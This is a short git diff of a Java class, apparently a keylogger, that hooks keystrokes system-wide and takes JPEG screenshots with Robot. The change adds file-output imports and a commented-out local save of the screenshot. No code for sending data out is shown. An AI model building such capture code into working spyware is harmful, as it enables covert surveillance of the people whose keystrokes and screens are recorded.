@@ -9,6 +9,8 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.InetAddress;
 
@@ -19,8 +21,7 @@ public class CapturaTeclado {
 	private static boolean run = true;
 
 	public static void main(String[] args) {
-		// Might throw a UnsatisfiedLinkError if the native library fails to load or a
-		// RuntimeException if hooking fails
+		
 																	
 		GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of
 																		// raw input
@@ -42,6 +43,7 @@ public class CapturaTeclado {
 						BufferedImage image = robot.createScreenCapture(screenRectangle);
 						ByteArrayOutputStream baos = new ByteArrayOutputStream();
 						ImageIO.write(image, "jpg", baos);
+						//ImageIO.write(image, "jpg", new File("foto.jpg"));//Escribe en ruta local
 						byte[] byteImage = baos.toByteArray();
 						baos.flush();
 						baos.close();
